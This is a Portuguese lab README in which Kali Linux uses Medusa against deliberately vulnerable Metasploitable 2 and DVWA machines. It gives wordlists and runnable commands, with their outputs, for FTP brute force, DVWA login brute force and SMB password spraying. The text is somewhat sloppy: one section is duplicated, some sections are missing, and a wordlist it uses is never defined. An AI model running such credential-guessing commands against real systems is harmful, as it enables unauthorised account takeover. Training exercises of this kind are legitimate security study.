# ProjectCyberSecurityDIO
Este repositório contém o laboratório completo utilizando Kali Linux, Metasploitable 2, DVWA e a ferramenta Medusa. O objetivo é simular ataques de força bruta, password spraying e brute force em aplicações web.

🧩 1. Configuração do Ambiente
🔧 1.1 Máquinas Virtuais Utilizadas

Foram usadas duas máquinas no VirtualBox, conforme instruído no desafio:

✔ Kali Linux (Atacante)
IP configurado: 192.168.79.10

Interface: Host-Only

✔ Metasploitable 2 (Alvo)
Linux vulnerável para testes
IP configurado: 192.168.79.20

Interface: Host-Only

1.2 Teste de Conectividade

No Kali:

ping 192.168.79.20
Se responder → ambiente OK.

⚔️ 3. Ferramenta Utilizada: Medusa

Medusa já vem pré-instalado no Kali. Caso precise instalar:
sudo apt install medusa -y

📁 4. Wordlists Utilizadas

Crie uma pasta no repositório chamada:

/wordlists

✔ 4.1 users.txt – Usuários DVWA
admin
guest
test
user

✔ 4.2 users-spray.txt – Para SMB Password Spraying
msfadmin
user
guest
service
backup

✔ 4.3 users-spray.txt – Para SMB Password Spraying
msfadmin
user
guest
service
backup

✔ 4.4 passwords.txt – Para FTP
msfadmin
123456
password
ftp123
admin

🗡️ 5. ATAQUE 1 — Força Bruta FTP com Medusa
🎯 Objetivo

Encontrar a senha do usuário msfadmin no serviço FTP vulnerável do Metasploitable.

▶️ Comando Utilizado
medusa -h 192.168.79.20 -u msfadmin -P wordlists/passwords.txt -M ftp

🔍 Resultado
ACCOUNT FOUND: [ftp] Host: 192.168.79.20 User: msfadmin Password: msfadmin

🌐 6. ATAQUE 2 — Força Bruta em Formulário Web (DVWA)

DVWA está disponível em:

http://192.168.79.20/dvwa/login.php

▶️ Comando Medusa para login web
medusa -h 192.168.79.20 -U wordlists/users.txt -P wordlists/dvwa-pass.txt -M web-form \
 -m FORM:"/dvwa/login.php?username=&password=&Login=Login:Login failed" \
 -m DENY:"Login failed"

🔍 Resultado
ACCOUNT FOUND: [web-form] Host: 192.168.79.20 User: admin Password: password


📁 7. ATAQUE 3 — Password Spraying em SMB
🎯 Objetivo

Testar uma única senha em vários usuários, simulando ataques reais contra serviços SMB.

▶️ Comando Utilizado
medusa -h 192.168.79.20 -U wordlists/users-spray.txt -p 123456 -M smbnt

🔍 Resultado
ACCOUNT FOUND: [smbnt] Host: 192.168.79.20 User: msfadmin Password: 123456

🏁 9. Conclusão

Neste projeto foram simulados três cenários:

Brute force em FTP

Força bruta em formulário web (DVWA)

Password spraying em SMB

Foram criadas wordlists personalizadas, analisados retornos, validados acessos e documentadas recomendações de mitigação.
O laboratório proporcionou uma compreensão prática de ataques comuns e como preveni-los.
